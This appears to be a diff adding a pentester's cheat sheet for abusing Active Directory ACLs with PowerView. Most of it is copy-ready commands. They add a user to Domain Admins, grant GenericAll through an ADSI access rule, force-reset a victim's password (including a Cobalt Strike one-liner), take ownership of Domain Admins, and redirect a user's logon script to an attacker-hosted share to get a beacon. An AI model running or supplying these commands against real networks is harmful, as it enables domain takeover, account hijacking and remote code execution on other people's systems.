@@ -1,0 +1,116 @@
+WINDOWS - POWERVIEW, ENUMERATE GROUPS-AC
+Using Powerview Master branch (Not Dev Branch)
+
+https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-acls-aces
+
+What does the powerview output look like?
+
+InheritedObjectType   : All
+ObjectDN              : CN=LocalAdmins,CN=Users,DC=it,DC=RagePwn,DC=local
+ObjectType            : All
+IdentityReference     : IT\Domain Admins
+IsInherited           : False
+ActiveDirectoryRights : GenericAll
+PropagationFlags      : None
+ObjectFlags           : None
+InheritanceFlags      : None
+InheritanceType       : None
+AccessControlType     : Allow
+ObjectSID             : S-1-5-21-948911695-1962824894-4291460540-1234 
+
+
+Step 0. Do a sweep of what ACL's you have permission over look for WriteDACL, GenericAll etc
+
+Invoke-ACLScanner
+
+Step 1. Find basic info about a group
+
+a. Get-NetGroup "localadmins" -FullData
+
+b. Grab data from distinguished name field on output e.g., "CN=Domain Admins,CN=Users,DC=RagePwn,DC=local"
+
+Step 2. Verify what ACL's we have privileges over
+
+example 1, get ACL listing over the group Domain Admins. Get-ObjectAcl -ResolveGUIDs | ? {$_.objectdn -eq "CN=Domain Admins,CN=Users,DC=RagePwn,DC=local"}
+
+example 2, Get ACL listing over the user george as the user bob. Get-ObjectAcl -ResolveGUIDs -SamAccountName george | ? {$_.IdentityReference -eq "RagePwn\bob"}
+
+**Look at Identity Reference - this should be your name e.g., RagePwn\normaluser99
+**Look at Active Directory Rights - Generic All etc means you can do anything, see below for a list of rights
+
+Step 3. Abuse Examples
+
+a. If you have generic all under Active Directory Rights, you can add yourself to a group
+
+net group "domain admins" normaluser99 /add /domain
+
+net user normaluser99 /domain; Add-NetGroupUser -UserName normaluser99 -GroupName "domain admins" -Domain "offense.local"; net user normaluser99 /domain
+
+# with active directory module
+Add-ADGroupMember -Identity "domain admins" -Members spotless
+
+# with Powersploit
+Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
+
+b. If you have WriteDacl, WriteOwner you can give yourself generic all on the group "localadmins"
+
+$ADSI = [ADSI]"LDAP://CN=LocalAdmins,CN=Users,DC=it,DC=gcb,DC=local"
+$IdentityReference = (New-Object System.Security.Principal.NTAccount("spotless")).Translate([System.Security.Principal.SecurityIdentifier])
+$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,"GenericAll","Allow"
+$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)
+$ADSI.psbase.commitchanges()
+
+c. If you have WriteProperty on Active Directory Rights add yourself to a group  
+
+net group "domain admins" normaluser99 /add /domain
+
+# with active directory module
+Add-ADGroupMember -Identity "domain admins" -Members spotless
+
+# with Powersploit
+Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"
+
+If we have Extended Rights on User-Force-Change-Password Object Type, we can reset a user's password without them knowing
+
+d. If you have Self-Membership on an object type, you can add yourself to a group
+
+net user spotless /domain; Add-NetGroupUser -UserName spotless -GroupName "domain admins" -Domain "offense.local"; net user spotless /domain
+
+e. If we have ExtendedRight on User-Force-Change-Password object type, we can reset the user's password without knowing their current password:
+
+Get-ObjectAcl -SamAccountName normaluser99 -ResolveGUIDs | ? {$_.IdentityReference -eq "OFFENSE\spotless"}
+
+#powerview
+Set-DomainUserPassword -Identity normaluser99 -Verbose
+
+$c = Get-Credential
+Set-DomainUserPassword -Identity normaluser99 -AccountPassword $c.Password -Verbose
+
+#one-liner, for things like Cobalt Strike
+Set-DomainUserPassword -Identity delegate -AccountPassword (ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+
+f. If we have Write Owner on a Group, we can become the owner of that group
+
+Set-DomainObjectOwner -Identity S-1-5-21-2552734371-813931464-1050690807-512 -OwnerIdentity "normaluser99" -Verbose
+
+-Identity if the SID of Domain Admins
+-OwnerIdentity is the new owner of Domain Admins
+
+g. If we have WriteProperty on an Object Type (in this case, Script-Path) we can overwrite the logon script path of a user
+
+Set-ADObject -SamAccountName normaluser99 -PropertyName scriptpath -PropertyValue "\\10.0.0.5\totallyLegitScript.ps1"
+
+The above command will set normaluser99's logonscript to "\\10.0.0.5\totallyLegitScript.ps1" - beacons anyone?
+
+
+ACL Rights
+
+• GenericAll - full rights to the object (add users to a group or reset user's password)
+• GenericWrite - update object's attributes (i.e logon script)
+• WriteOwner - change object owner to attacker controlled user take over the object
+• WriteDACL - modify object's ACEs and give attacker full control right over the object
+• AllExtendedRights - ability to add user to a group or reset password
+• ForceChangePassword - ability to change user's password
+• Self (Self-Membership) - ability to add yourself to a group
+
+
